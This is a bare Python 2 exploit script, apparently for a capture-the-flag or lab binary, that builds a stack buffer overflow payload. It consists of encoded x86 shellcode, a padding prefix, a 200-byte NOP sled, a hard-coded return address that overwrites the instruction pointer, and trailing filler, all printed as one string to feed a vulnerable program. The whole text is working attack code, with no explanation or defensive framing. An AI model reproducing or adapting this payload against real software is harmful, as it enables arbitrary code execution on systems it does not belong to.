#!/usr/bin/python 

buf =  b""
buf += b"\xdb\xd3\xd9\x74\x24\xf4\x59\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51"
buf += b"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
buf += b"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50"
buf += b"\x38\x41\x42\x75\x4a\x49\x70\x31\x6b\x6b\x7a\x57\x7a"
buf += b"\x43\x63\x63\x77\x33\x30\x53\x53\x5a\x35\x52\x6c\x49"
buf += b"\x68\x61\x48\x30\x53\x56\x68\x4d\x4d\x50\x73\x6b\x51"
buf += b"\x4e\x52\x72\x72\x48\x44\x42\x73\x30\x44\x51\x51\x4c"
buf += b"\x32\x4a\x62\x30\x42\x71\x32\x70\x6c\x49\x6d\x31\x73"
buf += b"\x5a\x72\x46\x53\x68\x5a\x6d\x6f\x70\x4d\x59\x57\x31"
buf += b"\x76\x64\x6c\x73\x37\x74\x38\x30\x73\x56\x5a\x6d\x6d"
buf += b"\x50\x50\x43\x58\x30\x42\x46\x38\x4d\x4d\x50\x4f\x63"
buf += b"\x50\x59\x63\x5a\x37\x4f\x56\x38\x78\x4d\x4f\x70\x42"
buf += b"\x69\x32\x59\x4b\x48\x51\x78\x34\x6f\x54\x6f\x72\x53"
buf += b"\x55\x38\x72\x48\x34\x6f\x75\x32\x65\x39\x62\x4e\x6c"
buf += b"\x49\x58\x63\x76\x30\x43\x63\x4b\x39\x79\x71\x4c\x70"
buf += b"\x46\x6b\x68\x4d\x4f\x70\x35\x61\x69\x4b\x71\x7a\x37"
buf += b"\x71\x71\x48\x78\x4d\x6f\x70\x41\x41"

prefix = 'A' * (1036 - 200 - len(buf))
nopsled = '\x90' * 200
eip = '\xc0\xaa\xff\xff'
padding = 'X' * (1100 - 1036 - 4)
      
print prefix + nopsled + buf + eip + padding

